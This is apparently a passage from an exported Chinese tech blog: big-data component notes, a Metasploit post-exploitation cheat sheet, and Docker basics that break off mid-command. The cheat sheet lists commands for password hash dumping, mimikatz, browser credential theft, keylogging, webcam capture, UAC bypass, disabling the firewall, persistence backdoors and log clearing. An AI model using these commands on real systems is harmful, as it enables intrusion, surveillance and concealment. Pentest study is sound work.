能够低延迟的计算反馈结果\n- MLLib:机器学习,根据历史数据进行建模，根据模型和提供的数据进行数据预测\n- GraphX:图计算,主要用于关系统计,关系查询\n- SparkR: R语言库,提供R语言接口，可以使用R语言操作Spark\n- Structured Streaming:流处理，将数据存入-个无边界表(新数据不断添加，旧数据不断移除)使用增量的方式获取表数据内容进行执行\n\n\n# Streaming\n    分布式流处理组件\n\n## 关键特性:实时响应，延迟性低\n- 数据不存储先执行(离线处理先存储数据然后再执行)\n- 连续查询(程序运行后就不终止,除非系统故障导致的终止或者手动停止)\n- 事件驱动:传入的数据信息触动任务处理\n\n\n## Streaming系统架构\n\n![Streaming系统架构](img_22.png)\n\n- Client:客户端接口\n- Nimbus (主节点) :接收客户端的请求，管理Supervisor从节点，管理任务分配，编写任务书\n- Supervisor (从节点) :实行任务，管理worker\n- Worker (进程) :程序执行\n- Executor (线程) :每个Executor中默认执行一 一个Task\n- Task (任务) : Task分别对应每一 个Spout/Bolt组件的执行 \n- ZooKeeper:监控Nimbus主节点的状态，如果主节点故障切换备用节点\\\n监控Supervisor从节点状态，如果从节点故障,通知Nimbus迁移任务，启动自动恢复\\\n接收Nimbus任务书，将每个从节点的任务存放在每个Supervisor自己对应的目录中\n\n\n## Streaming任务架构\n- Topology:拓扑结构,封装任务执行流程\n- Spout:发送数据源的组件,接收第三方数据收集I具提供的数据发送到数据流\n- 每个应用只有一个spout\n- Bolt:从数据流中获取数据,执行数据处理，如果当前bolt不是最后-个执行程序将结果放回数据流一个应用中可以有多个bolt\n- Tuple:数据流中的数据格式，组件之间数据传输的格式，元组中包含两个参数(id, stream)\n\n## Streaming执行任务\n1. 用户通过Client提交应用到Nimbus中\n2. Nimbus接收到应用后，根据应用情况及当前集群的从节点情况编写任务书\n3. 将任务书.上传到ZooKeeper中\n4. ZooKeeper接收到任务书后根据每个节点将对应的任务存放在节点对应的目录下\n5. Supervisor周期性监测自己在ZooKeeper中的目录有没有新任务\n6. Supervisor发现新任务，根据任务书内容从Nimbus中下载任务所需要的jar包\n7. Supervisor执行任务,反馈执行状态给Nimbus .\n8. Nimbus将任务状态反馈给Client\n\n\n## 根据任务架构执行\n1. 获取拓扑结构\n2. 根据拓扑结构分别找到每一流程的处理单元\n3. 按照路程执行处理单元\n\n## 消息传递语义\n- 最多一次:数据发送只发送一次, 可靠性最低，吞吐量最大\\\n    缺点:可能存在数据丢失的情况\\\n    优点:数据一定不会被重复执行\n- 最少一次:数据可能会发送多次，可靠性高，吞吐量较小\\\n    优点:数据不会丢失\\\n    缺点:数据可能会被重复执行\n- 仅有一次(精准一次) :数据就发送一-次, 并且保证发送成功，可靠性高，吞吐量最低\\\n    优点:数据不会丢失，且数据不被重复处理\\\n    缺点:消耗的资源和时间较多\n\n## Ack机制(消息传输最少一次)\n![Ack机制](img_23.png)\n\n\n\n# Flink\n    分布式实时计算引擎(流处理引擎)\n\n\n## Flink VS Spark Streaming\n- Flink可以做流处理(侧重)也可以做批处理，底层引擎属于流处理引擎\n- 通过流处理引擎模拟批处理形式实现的批处理\n- Spark可以做流处理也可以做批处理(侧重点)，底层弓|擎属于批处理引擎\n- 通过批处理引擎,模拟流处理实现的流处理功能\n\n## Flink的关键特性\n    状态、时间、窗口、检查点\n\n\n## Flink系统架构\n![Flink系统架构](img_24.png)\n\n- 部署形式: Local (单机版部署)\\\n    Cluster (Standalone: Flink集群自己管理资源调度\\\n    Yarn:借助Yarn组件帮助管理协调资源和任务)\\\n    Clound (云部署)\n- Flink核心模块: Runtime (不管是流处理还是批处理都是在Runtime中执行)\n- 接口层: DataStream (流处理)和DataSet (批处理)\n- Table API & SQL:处理结构化数据\n```sql\nTable API:将操作应用封装成方法\n    select(\"t_ demo \").where(\"条件\")\n    \nSQL:基于Table API使用，\n    sqlQuery(\"select * from t_ demo where条件\")\n```\n\n## 有界流和无界流\n- 有界流:知道开始，知道结束，使用批处理处理有界流数据.\n- 无界流:知道开始，不知道结束，使用流处理接口进行数据处理\n\n## DataStream:用于存储数据的数据集，只能执行流处理操作\n- 基于流处理运行环境获取到的数据\n\n## DataSet:用来接收数据的数据集，只能执行批处理操作\n- 基于批处理运行环境获取到的数据\n\n`并不能在一个应用中同时接收流处理和批处理接口，以此实现流处理和批处理的共用`\n\n\n## Flink运行流程\n\n![Flink运行流程](img_25.png)\n\n1. DataSource:接收数据输入，从数据源获取数据\n2. Transformations:数据转换，数据处理过程\n3. DataSink:将最终数据结果输出到指定位置(如HDFS、 HBase、 文件、数据库等)\n\n## Flink程序运行流程\n`1. 创建运行环境流处理/批处理`\n2. 通过运行环境对象获取数据源数据(DataStream/DataSet)\n3. 针对数据集进行数据转换\n4. 将最终结果进行输出(批处理的print算子)\n`5. 最后执行程序(行动算子) executor()`\n\n## Flink运行程序\n![Flink运行程序](img_26.png)\n\n1. Client向JobManager发起请求\n2. Client对任务进行优化等操作\n3. JobManager分配任务给TaskManager\n4. TaskManager接收到任务后执行任务\n5. TaskManager反馈任务执行状态给JobManager\n6. JobManager统一反馈给用户\n\n- Flink Client:用户通过Client连接到JobManager\n- JobManager (主节点) :接收用户请求，管理资源任务分配，管理从节点信息\n- TaskManager (从节点) :接收任务处理任务，反馈给主节点\n- Standalone部署:创建Task Slot: Flink的抽象资源\n\n## Flink状态\n    区别于其他组件的一-个特性，支持状态管理(中间结果状态)\n\n## Fink窗口类型\n- 滑动窗口: 窗口移动方式是平移,设定参数时需要设定窗口大小,滑动距离.窗口大小固定,可能会出现数据源重复和数据丢失的情况\n- 滚动窗口: 窗口移动方式滚动,滚动距离就是窗口大小,设定窗口时只需要设定窗口大小.窗口大小固定,不会出现数据重复或者数据丢失的情况,会出现空窗口的情况\n- 会话窗口: 由会话启动的窗口,设定过期时间,窗口代销不固定,运行时不会有丢失的数据,不会出现空窗口\n- 时间窗口: 以时间为条件设定的窗口,`分别可以再分为滑动或滚动`\n- 数量窗口: 由会话启动的窗口,设定过期时间,`分别可以再分为滑动或滚动`\n\n## Fink的时间类型\n- 时间类型: 事件发生的时间 \n- 时间类型: 时间达到处理系统的时间\n- 处理时间(默认): 时间被处理的时间\n- 时间乱序问题: 事件被处理的顺序不是时间产生顺序\n- 时间乱序原因: 数据受到数据传输影响\n\n\n## Watermark(水位线/水印): 解决数据乱序问题\n- 设定水位线时间,当水位线设定的时间时间也达到系统时,就会触发窗口执行\n- 可设置水位线延迟,可允许窗口延迟触发\\\n\n\n\n\n## 对于延迟数据的处理方式\n- 丢弃(默认): 当窗口已经被触发过,该窗口的数据达到也会被丢弃,不会被执行\n- 可允许延迟: 设定可允许延迟时间,窗口已经被执行,但是输在可允许延迟时间达到,重新重发窗口的执行\\\n  `allowedLateness`(可延迟时间)\n- 收集后做统一处理: 把所有的延迟数据收集起来,在程序最后做统一处理\\\n`OutputTag<T> lateOutputTag = new OutputTag //用于存放延迟数据的数据集`\\\n`.side0utputLateData(late0utputTag)`\n\n## Flink容错性 (CheckPoint实现)\n1. `CheckPoint:检查点，自动触发,当任务结束后会自动删除`\n    - 保存当前任务状态，周期性触发,默认情况下不启动检查点\n    - 在启动检查点时就可以设定周期时间，单位ms: .enableCheckPointing(10000)\n    - 修改消息传输语义(默认情况仅有一次): .setCheckPointMode(CheckPointMode.AT_LEAST_ONCE)\n    - 快照超时时间:防止一个问题快照影响大量快照创建堆积: .setCheckpointingTimeout(60000)\n    - 可以设定检查点之间的最小间隔时间\n    - 可以设定最大并行执行数量\n    - 设定外部检查点:可以把检查点信息存储于在外部系统中，不会因为Flink系统问题受到影响\n2. SavePoint:保存点，底层CheckPoint, 手动触发,任务结束后也依旧保留\n\n## 状态保存\n内存:默认，state和checkpoint都存储在内存，只是用本地测试\n文件系统: state在内存， checkpoint在文件系统中\n数据库: state存储在内置数据库中，checkpoint在文件系统中，针对大量数据任务处理的场景\n\n# Flume\n    Flume属于一个高性能、分布式的海量日志采集工具可以适用于流数据采集、也可以用于静态数据采集\n\n## Flume基础架构\n    (主用应用于单节点数据采集)\n\n![Flume基础架构](img_27.png)\n\n- Flume中有两个组件对外交互: source、 sink\n- source:采集数据,接收数据输入\n- channel:管道、 临时存储\n- sink:数据输出\n\n## Flume多agent架构\n    (主要用于集群外采集传递到集群内采集)\n\n![Flume多agent架构](img_28.png)\n\n- 把第一级的Flume数据输出到第二级Flume中\n- 设定第一-级Flume的sink类型为avro协议或者thrift协议可以将数据存储到下一级Flume的Source\n\n## Flume多Agent合并 \n    (将多数据源采集到的数据汇总处理)\n![Flume多Agent合并](img_29.png)\n\n## Flume数据传输基本单位\n- event: 基本单位,header+ byte[]\n- 当source采集数据时，在source内部将数据封装成event\n\n## Flume Agent原理\n![Flume Agent原理](img_30.png)\n\n1. 在source内部可以将数据封装成event\n2. source将event传输给channel处理器(拦截器)可以做数据简单处理\n3. 清洗完后的数据通过channe|选择器将event输入到指定的channel\n4. SinkRunner在程序运行时就启动\n5. 使用sink处理器实例化一个指定类型的sink从指定的channel中抽取数据\n6. 将抽取到的数据按照设定的类型和目的路径将数据输出\n\n## Flume Source \n    (数据收集、接收数据输入)\n- 驱动型:被动接收数据输入\n- 轮询型:周期性的主动扫描是否有新数据产生\n\n## Flume Channel \n    (数据存储)\n- MemoryChannel (内存) : event数据存放在当前节点的内存中\\\n    读写速度快，数据未持久化，占用内存空间\\\n    capacity:最大内存容量(默认情况下使用到节点内存存满为止)\n  \n- FileChannel (文件) :使用WAL,管理上比较复杂\\\n数据可持久化，数据读写速度慢于内存形式\n  \n- JDBCChannel (内置数据库) : derby数据库，可以替代File存储的形式\\\n数据可持久化，数据读写速度慢于内存形式\n  \n## Flume Sink \n    (数据输出)\n\n## Flume的Source、Channel、 Sink之间的关系\n- `一个Source至少连接一个Channel`\n- `一个Sink只作用于一个Channel`\n\n## Flume级联节点\n    级联节点间传输的数据可以进行加密、压缩\n- 加密:提高数据传输安全性\n- 压缩:提高整体传输速度(减少传输时间)\n- `Flume内部数据传输(source --> channel --> sink) 不需要加密`\n\n## Flume运行实例\n    内容需要配置到配置文件中(自定义.properties)\n```bash\na.sources= r1\na.channels=c1\na.sinks=k1\na.sourses.r1.type=taildir\na.sourses.r1.postion= 记录pos记录的文件\na.sourses.r1.filegroups=f1 f2\na.sourses.r1.filegroups.f1 = 要监控的文件\na.sourses.r1.filegroups.f2= 要监控的文件\na.channels.c1.type=memory\na.sinks.k1.type=logger\na.sources.r1.channels=c1\na.sinks.k1.channel=c1\n```\n\n## Flume运行命令\n```bash\nflume-ng agent --name a --conf flumecï 71411Z --conf-file 配置文件 - Dflume.root.logger=info, console\nflume-ng agent -n a -C flume配置文件路径 -f 配置文件 -Dflume.root.logger=info, console\n```\n\n# Kafka\n    分布式日志系统(发布订阅消息系统)，可分区、多副本、多订阅\n\n## 消息传输形式\n- 点对点:数据在被获取到之后就会被从消息系统中删除(只有-一个用户可以获取到这个消息)\n- 发布订阅:消息发布之后，就算被用户获取之后也不会删除，依旧保留在系统中提供给其他用户获取\n\n## Kafka的特点\n- 可支持TB级别的数据也能在常量时间内的访问性能\n- 高吞吐率:单节点每秒可以传输100K条数据\n- 可分区:数据以分区形式存储\n- 多副本:提高数据容错性\n- 同时支持流处理和批处理\n- 可扩展性:本身属于集群由多节点组成，扩展节点\n\n## Kafka拓扑结构\n![Kafka拓扑结构](img_31.png)\n\n- Kafka:由broker集群组成\n- Producer:数据发布者，发布消息，将数据发布到Kafka中存储\n- Consumer:数据消费者，订阅消息，从Kafka中获取数据\n- ZooKeeper: Kafka强依赖，监测集群状态\n\n## Kafka集群系统架构\n![Kafka集群系统架构](img_32.png)\n\n![Kafka集群系统架构](img_33.png)\n\n## 消费组:consumer group\n    每个消费者一定是属于某一个消费组\n- 消费数据规则:消费组内的数据是竞争的,消费组间的数据是共享的 \\\n  一条消息可以被多个消费组获取,但是每个消费组只能有一个消费者消费信息\n- Kafka Topic:消息类别名\\\n用于区分记录数据、发布者发布数据时需要指定topic,消费者订阅数据时指定topic\n- Kafka Partition:分区，数据写入:顺序追加的方式\\\n数据以分区的形式存储，在创建topic时可以指定当前topic中有几个分区\n- Kafka Segment:分段\\\n每个消息就是一个分段, 分段由两个文件组成.index和.log\n- Offset:偏移量值\\\n每一个消息都有的唯一标识位置\n- 每个消费组都会维护一份offset文件(当前组中的成员读取的数据位置)\n- 读取数据时数据定位: broker --> topic --> offset\n\n## Kafka的其他重要概念\n- replica:副本，在创建partition的时候指定该分区有几个副本\\\n--partitons 1 --replaction-factor 2\\\n数据文件为2份，partiton本身也属于副本的一部分\n- leader:从副本中选取一个leader对外提供服务，发布者和消息者只跟leader交互\n- follower:除leader以外的其他副本都是follower, follower同步leader信息\n- controller: kafka中的一 -个服务器: leader选举、 leader切换\n- ISR列表:列表中的follower,能正常同步leader信息\\\n只有在列表中的follower有资格成为下一-任leader\\\n刚开始所有的follower都在ISR列表中，当follower故障不能及 时同步leader时会被移除列表\n  \n## Kafka分区副本\n    (节点和节点之间的分区互为主备)\n![Kafka分区副本](img_34.png)\n\n分区副本同步\n\n    (follower从leader同步数据 )\n![分区副本同步](img_35.png)\n\n- 如果所有分区都出现故障\\\n可靠性高、恢复速度慢:等待ISR中的分区恢复，第一个恢复就是leader\\\n可靠性低、恢复速度快:等待分区恢复，第一个恢复的不管是不是ISR列表中的分区也成为leader\n- 可靠性传输:幂等性(操作一次和多次的结果是一样)\\\n给每条消息一个唯-标识id, 消息传递后使用一个列表记录已传输成功的消息id\\\n每条消息传输到达时都会被使用id在列表中查询，查看id是否存在\\\n如果存在:说明消息之前已经被传输过\\\n如果不存在:正常处理，并且处理完后将id写入列表\n- acks机制(检测数据是否发送成功)\\\nacks=0:不管数据是否发送成功\\\nacks=1:当数据写入leader时就认为成功\\\nacks=all:当数据写入leader并且follower都接收到才反馈成功\n- Kafka持久化存储数据(不管数据有没有被消费过)\n- 旧数据的处理方式:删除/压缩\\\n删除:配置数据过期时间\\\n压缩:根据键值对的key值只保留最新的value值，以前的值就删除\n- Kafka高吞吐的原因\\\n顺序读写:数据以追加形式写入分区，速度远快于随机读写\\\n零拷贝:数据写入不需要经过数据缓冲区直接到达磁盘\\\n分区:数据可以分别存在多个分区中，读取的时候可以并行的从分区中读取到数据\\\n压缩:可以对数据进行压缩\n  \n`分区副本:只有leader对外提供服务的, follower只做同步操作`\n\n# Loader\n    基于开源的Sqoop组件开发得到的\n\n## Loader\n- Loader数据导入导出(作用在关系型数据库和非关系型数据库之间)\\\n关系型数据库:结构化\\\n非关系型数据库:非结构化\n- 数据导入:数据从RDB导入到NoSQL\n- 数据导出:数据从NoSQL导出到RDB\n- Loader相比较Sqoop组件的增强特性\\\n图形化:提供WebUI界面可以通过界面配置任务,连接器的配置`MRS (Hue)`\\\n高性能:底层使用MapReduce并行处理\\\n高可靠:主备双机的搭建\\\n    作业失败后允许重试\n    作业失败后不会有残留的数据\n安全性:使用kerberos进行安全认证\n  \n## Loader模型架构\n![分区副本同步](img_36.png)\n\n1. Loader Client: Tool: 命令行模式连接Loader服务\n    - Web UI: MRS图形化的方式连接到Loader\n    \n2. Loader Server:\n    - Restful API (http+json) 对外提供的连接接口\n    - JobSheduler: Transform 转换模块-->数据处理.\\\n    Execution执行模块-->执行计划\\\n    Submission提交模块-->提交到MR\\\n    JobManager:管理任务执行状态\n    - Metadata Repository:元数据仓库，存储管理元数据\n    - HA Manager:主备管理\n    \n\n## Loader任务执行\n![Loader任务执行](img_37.png)\n\n1. Client提交任务\n2. Loader任务计划\n3. 将任务提交给Yarn\n4. Yarn调配资源将任务分配为Map或Reduce任务执行\n5. 将数据存入设定的存储介质中\n\n## Loader任务配置\n- 输入:数据来源的配置\n- 转换:字段映射、获取数据、过滤数据、并发执行数量\n- 输出:数据最终输出目的地的配置\n\n# ElasticSearch\n    分布式检索服务,适用实时场景\n    Hive:可以做查询分析，底层MR处理，不适用实时\n\n## ElasticSearch特点\n- 基于Lucena扩展\n- 可以水平扩展\n- 原型环境和生产环境可以无缝切换\n- `作为非关系型数据库NoSQL数据库使用`\n- 支持结构化数据和非结构化数据\n\n\n## 索引\n1. 正排索引:在文件中查找关键字 \\\n    扫描每个文件内容找到跟关键字相关的文件，返回文件 \n   \n\n2.  倒排索引:根据关键字查找文件(提前给文件设定关键字)\\\n    根据关键字查哪些文件标记了这个关键字\\\n    快速查找相关文件，并且文件相关度更高 \n    \n\n## ElasticSearch系统架构\n![ElasticSearch系统架构](img_38.png)\n\n- Client:连接到ZooKeeper获取集群信息，连接到集群\n- EsMaster:主要任务分配，管理EsNode信息， 不参与分片级别的数据检索\n- EsNode:处理用户管理索引|操作，管理自身分片信息(数据默认存储在内存中)\n- ZooKeeper: es强依赖，管理集群状态，并且记录集群信息\n\n## ElasticSearch中的核心概念\n- 索引: index --> 命名空间\n- 文档: document --> 数据存储，ES中的检索基本单元\n- 映射: mapping --> 约束字段类型\n\n## ElasticSearch命令使用\n\n```bash\n数据添加/修改: put /索引/_doc/id\n{\n  \"key\":\"value\"\n}\n数据查询: get /索引/_doc/id\n数据删除: delete /索引/_doc/id\n\n```\n\n\n# Redis\n    基于内存的，网络高性能数据库\n- 读取速度快，低延迟\n- 适用于实时场景\n- 可持久化(RDB/AOF)\n- key-value\\\nkey命名:见名知意\\\nvalue:可以存储多样数据\n- 属于NoSQL数据库(存储多样化:图像、视频、音频、数字、文字等)\n\n\n## Redis应用场景\n- 排序类应用\n- 设置过期时间应用\n- 统计计数\n- 消息队列\n- 临时存储\n\n## Redis系统架构\n- `无中心、自组织的集群`: 集群中的所有节点会维护一个集群拓扑\n- 分桶:根据key值计算hash存储进不同的槽中\n- 集群拓扑中维护的就是槽和节点的映射关系\n- `Redis节点只帮助用户重定向，不进行转发`\\\n重定向: Client发出多次请求(`Client分 别请求节点`)\\\n转发: Client只需要请求第一个节点，节点帮助Client向正确的节点发出请求(Client只需要请求第一 台节点)\n  \n## Redis读写流程\n\n![Redis读写流程](img_39.png)\n\n\n1. Client向任意一 个节点发出请求，连接到redis\n2. 从redis节点中获取redis集群拓扑，得到key存储的server信息\n3. 可以获取到key对应的槽所在的server信息\n4. 如果做读取，对server发起读请求，如果是写入，就发起写请求\n5. `如果在Client获取拓扑时，数据发生变动，从一个节点迁移到另-一个节点`\n6. 此时Client获取到的是旧的拓扑，向原定的server发起请求\n7. server接收到请求后发现Client要请求的数据已经被迁移,会告诉Client数据被迁移到哪个节点\n8. Client从原server中接收到正确server的反馈信息\n9. 对新server重新发起一-次请求，获取数据响应\n\n## Redis关键特性\n- 支持多数据库\\\n名称不支持自定义，从0开始递增\\\n默认情况下支持1 6个数据库,不做更改的情况下使用的是0号数据库\\\n如果要切换当前使用的数据库: `select 0`\n- 可以通过正则表达式匹配所有符合规则的key值\\\nkeys正则表达式\\\n要查找所有的a开头后面跟数字的所有的key值: `keys a[0-9]*`\n- 判断key是否存在: `exists key`\n- 删除key值: `del key key2`\n- 获取key对应的类型: `type key`\n- `redis中不区分大小写( 单个单词要不就全大写要不就全小写)`\n\n## Redis数据类型及使用\n- String的数字可以作为数值类型使用\n- Hash添加数据时value是键值对(应用于对象数据存储)\n- List可重复的有序集合\\\n操作数据时可以区分左右(前后)查询整个集合中的数据时`lrange key 0 -1`\n- Set不重复无序的集合\\\n可以针对集合计算交集、并集等\n- Sorted Set:有序集合,可以根据给key的分数进行排序\n\n## Redis性能优化\n- 可设置key的生存时间\n- Redis管道(pipeline) --> 管道数据传输速度快于普通传输(仅在Java API中)\n- 数据排序Sort,如果是对集合进行排序Sorted Set\n- Redis持久化(RDB/AOF)\\\nRDB(默认) :使用快照的方式对当前数据进行持久化存储\\\n创建快照的条件(在指定时间内有指定数量的key发生变化): `save 时间s数量`\\\n手动触发: sava、bgsave\\\nsave:使用主进程运行，在创建快照过程中会堵塞其他进程运行\\\nbgsave:划分一个子进程用于执行快照，不会影响其他得到进程运行\\\nAOF:使用的日志文件形式存储信息\\\n可以设定数据发生变更时进行记录\\\n- Redis内存占用情况\\\n相同数据的情况下，32位操作系统比64位所使用的内存更少\\\n100万条简单键值对，占用100M空间，实际占用空间较少，可存储数据量较大\n  \n## Redis的优化\n1. 精简键名值数据:尽可能简单，但是能知意-->`可以节省存储空间`\n2. 在不需要持久化的应用场景中关闭持久化功能\n3. 内部编码优化\n4. SlowLog:记录运行超时命令系统\n5. 修改Linux内核内存分配策略: 1:不需要检验内存情况，可以直接运行任务直到内存使用完为止\n6. 关闭THP:节省资源开销(redis修改时先复制再对复制内容修改)\\\n(THP:如果数据只有200K,使用THP的情况下，这个大页大小约20M\\\n不使用THP时，复制后总大小400K,使用了THP复制后总大小40M)\n7. 修改linux中的tcp最大连接数\n8. 限制Redis使用内存大小\n9. 做多条数据操作时，尽量选择批量操作命令不要通过循环执行\n\n# 安全认证&权限管理Kerberos & Ldap\n    在大数据平台中，统一身份体现在:只要通过用户名和密码成功登陆，就可以操作授`权过的组件`\n    统一用户管理系统:用户及相关权限管理、用户登录后的相关管理等\n\n##  统一身份认证管理系统\n- 管理模块:管理信息存储,管理认证，用户请求\n- 信息存储模块:存储用户信息、权限信息\n- 认证模块:通过用户请求和当前系统存储的用户信息做比对，确认用户是否正确、核查用户权限\n\n## Ldap目录服务系统\n- 目录:加快数据检索速度\n- 轻量级目录访问协议、跟踪协议\n\n## LdapServer系统结构(树状结构)\n- 树状结构中会包含很多节点，每个节点都有自己的名称dn(当前节点及它的所有父节点)\n- 根节点名称是dc,标记为区域\n- 区域的下一级是组织，组织节点名称: ou\n- 组织节点下一级是对象，对象节点名称: cn,存储对象属性\n\n## Ldap功能模块设计\n- 查询类操作\n- 更新类操作\n- 认证类操作\n- 其他操作:放弃服务或者扩展服务\n\n## Ldap集成设计\n- 身份认证架构设计\n\n![Ldap集成设计](img_40.png)\n  \n- 身份认证流程设计\n    1. 应用侧提交认证请求\n    2. Thrift Server从Ldap获取相关用户信息\n    3. Thrift Server执行认证比对\n    4. 认证成功后将请求导向响应的应用\n   \n\n\n- 身份认证功能设计\n    可以通过组Group和角色Role的方式给用户赋予权限\\\n    Group:设置组权限，将用户添加到组中\\\n    Role:给角色设定权限，给用户匹配角色\n\n## Kerberos认证处理\n\n- krbServer中的三大核心: Client 、KDC、 KDC Server\n- Client :接收用户请求\n- KDC:生成密钥，发放密钥等\n- KDC Server:提供密钥服务\n\n## Kerberos应用流程\n1. 用户提供用户名和密码给登录认证系统\n2. 登录认证系统通过登录认证后，反馈一个当前用户的用户信息卡 (用户、密码、所授权信息)\n3. 用户获取到用户信息卡之后就可以进入到MRS中.\n4. 在MRS中找到对应的要使用的组件,提交自己的信息卡\n5. 组件对比信息卡查看是否具有当前组件的权限\n6. 用户前往权限授权中心,提交信息卡,权限授权中心根据信息卡对指定组件进行授权(ST)\n7. 用户获取到对应组件的授权信息，可以再次向组件发起请求(信息卡, ST)\n8. 组件接收到请求后再次校验,校验结果没问题的话，用户就可以正常使用组件\n","tags":["HCIA","大数据"],"categories":["笔记"]},{"title":"msf后渗透使用","url":"/2022/04/18/msf后渗透使用/","content":"# msf后渗透命令整理\n\n- 后渗透基本知识\n- 权限维持,权限提升,内网渗透等\n- 内网渗透:信息收集,读取用户hash,浏览器密码等\n- 域渗透:获取域控权限\n\n## 1.后渗透基本操作\n```bash\nbackground\t\t    让meterpreter处于后台\nsessions -i 会话号\t    与会话进行交互\nquit \t\t\t    退出会话\nshell\t\t\t    获取一个交互式shell\nirb\t\t            开启ruby终端\n```\n\n\n## 2.文件操作命令\n```bash\ncat \t\t    查看文件内容\ngetwd\t\t    查看当前工作目录\nupload\t\t    上传文件\ndownload\t    下载文件\nedit\t\t    编辑文件\nsearch\t\t    搜索文件\n```\n\n\n## 3.网络命令\n```bash\nipconfig/ifconfig\t\t查看网络接口信息\nportwd\t\t\t\t端口转发\t本机监听端口\t把目标机端口转到本机端口上\nrdesktop\t\t\t使用rdesktop来连接 -u 用户名 -p 密码\nroute\t\t\t\t获取路由表\n```\n\n\n## 后渗透基本操作\n```bash\nps\t\t\t    查看当前进程\nmigrate pid\t            将meterpreter进程pid移动到指定进程中\nexecute -H -i -f cmd.exe    创建新进程cmd.exe -H不可见\t-i交互\ngetpid\t获                   取当前进程的pid\nkill pid\t            杀死进程\ngetuid\t                    查看当前权限\nsysinfo\t                    查看目标机系统信息\n```\n\n## 后渗透高级操作\n```bash\nrun post/windows/gather/enum_applications \t获取安装软件信息\nrun post/windows/gather/dumplinks \t\t获取最近的文件操作\nrun scraper \t\t\t                获取常见信息\t\nrun post/windows/gather/enum_patches \t        获取补丁信息\nrun post/windows/gather/enum_domain  \t        查找域控\n\nload命令  \nload mimikatz                                   加载mimikatz\nwdigest\t                                        获取用户密码\nload incognito                      加载incognito盗取主机用户令牌假冒用户\n```\n\n\n### 信息收集\n```bash\nrun post/windows/gather/checkvm\t\t检查是否为虚拟机\ncmd下 quser\t\t查看用户是否在线\nidletime\t\t检查受害者闲置了多久\nscreenshot\t        截屏\n```\n\n### 用户口令\n```bash\nhashdump\t获取用户hash\nrun post/windows/gather/smart_hashdump\t获取域的密码\n```\n\n\n### 权限提升\n```bash\n普通用户利用漏洞获取权限\nuse exploit/windows/local/ms18_8120_win32k_privesc\n```\n\n\n### 自动匹配提权模块\n```bash\nuse post/multi/recon/local_exploit_suggester\npost/windows/gather/enum_patches\n```\n\n### 关闭防火墙\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n\n### 本地提权\n```bash\nsearch local/ms\n```\n\n\n### 绕过UAC\n```bash\nuse exploit/windows/local/bypassuac \nuse exploit/windows/local/bypassuac_injection \nuse windows/local/bypassuac_vbs \nuse windows/local/ask\n```\n\n\n### 获取system权限\n```bash\ngetsystem\n```\n\n### 缓存口令\n```bash\n获取谷歌chrome缓存\nrun post/windows/gather/enum_chrome\n\n获取火狐firfox缓存\nrun post/windows/gather/enum_firefox\n\n获取IE缓存\nrun post/windows/gather/enum_ie\n```\n\n### 键盘记录\n```bash\nkeyscan_start\t开启键盘记录\nkeyscan_dump\t显示捕捉到的记录\nkeyscan_stop\t停止键盘记录\n```\n\n### 域口令获取\n```bash\nsteal_token 试图窃取指定(pid)进程的令牌\nuse incognito\t\t加载incoginto功能(盗取目标主机的令牌或是假冒用户)\nlist_tokens -u\t\t列出目标主机用户的可用令牌\nlist_tokens -g\t\t列出目标主机用户组的可用令牌\n```\n\n### 摄像头信息\n```bash\nrecord_mic\t音频录制\nwebcam_chat\t\t查看摄像头接口\nwebcam_list\t\t查看摄像头列表\nwebcam_stream\t摄像头视频获取\n```\n\n### 后门持久化,权限维持\n``` bash\n1.migrate\nmigrate pid\n可以将meterpreter的当前进程迁移到其他指定进程中,这样做的好处是给后门一个相对稳定的环境,同时可以防止杀软\n\n2.metsvc\nrun metsvc -A\nmeterpreter提供两种方式的后门,一种是通过服务启动(metsvc),一种是通过启动项启动(persistence).\n通过服务(metsvc)启动方式,优点是命令简单方便,不需要设置太多参数.缺点是只要发现了这个后门,所有人都可以连接\n\n3.persistence\nrun persistence -S -U -X -i 5 -p 端口 -r ip\n通过开机启动项启动的方式,缺点是命令参数多比较复杂,可能因为启动项权限原因,导致失败,且并无回显.优点是,因为载入启动项中,所以一般的杀软都会放行,如果在用shellcode做下免杀会更好,当然这是后话\n-A   自动启动一个匹配的exploit / multi / handler来连接到代理\n-L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。\n-P   有效负载使用，默认为windows / meterpreter / reverse_tcp。\n-S   作为服务自动启动代理程序（具有SYSTEM权限）\n-T   要使用的备用可执行模板\n-U   用户登录时自动启动代理\n-X   系统引导时自动启动代理程序\n-h   这个帮助菜单\n-i   每次连接尝试之间的时间间隔（秒）\n-p   运行Metasploit的系统正在侦听的端口\n-r   运行Metasploit监听连接的系统的IP\n\n4.run vnc(远程控制,类似3389远程桌面)\nrun vnc\n\trun post/windows/manager/enable_rdp\t开启远程桌面\n\n5.getuid(创建一个用户,客户端化)\n常用命令\nrun getuid -e\t\t开启远程桌面\nrun getuid -u name -p password\t\t添加用户\nrun getuid -f\t4446 -e\t将3389端口转发到4446\n```\n### 清除痕迹\n清楚所有日志信息\n```bash\nclearev\t\n```\n\n\n","tags":["kali","渗透"],"categories":["工具使用"]},{"title":"docker基本使用","url":"/2022/04/18/docker基本使用/","content":"## docker帮助命令\n```\ndocker version 显示版本信息\ndocker help 帮助\ndocker info 基本信息\n```\n## docker镜像命令\n```\ndocker images\n# 可选项\n-a, --all   # 列出所有镜像\n-q, --quite # 只显示镜像的id\n```\n\n#### docker search 搜索镜像\n```\n# 可选项\n--filter=STARS=3000 # 搜索星在3000以上的\n```\n\n#### docker pull 下载镜像\n```\n# 下载镜像 docker pull 镜像名 tag\n# 如果不写tag默认就是最新版\n```\n\n#### 删除容器\n```\ndocker rm -f id # 删除指定容器\ndocker rm -f $(docker images -qa) # 删除所有容器\n```\n\n\n\n## docker容器命令\n\n**新建容器并启动**\n```\n--name = \"名字\" # 给容器起一个名字\n-d            # 后台方式运行\n-it           # 使用交互式方式运行\n-P            # 指定容器的端口\n    1.ip:主机端口:容器端口\n    2.主机端口:容器端口(常用)\n    3.容器端口\n-p            # 随机端口\n```\n\n**使用**\n```\nchenci@MacBook-Pro ~ %docker run -it centos /bin/bash\n\n退出\nexit\n```\n\n**查看运行的容器**\n```\ndocker ps \n# -a 历史运行过的容器\n# -n=? 显示最近创建的容器\n# -q 只显示容器的编号\n```\n\n**启动和停止容器**\n```\ndocker start id #启动容器\ndocker restart id #重启容器\ndocker stop id #停止当前正在运行的容器\ndocker kill id #强制停止当前容器\n```\n\n**查看日志**\n```\ndocker logs -tf --tail 日志条数 id\n```\n\n**查看镜像元数据**\n```\ndocker inspect id\n```\n\n**进入正在运行的容器**\n```\n# 方法一\ndocker attach id # 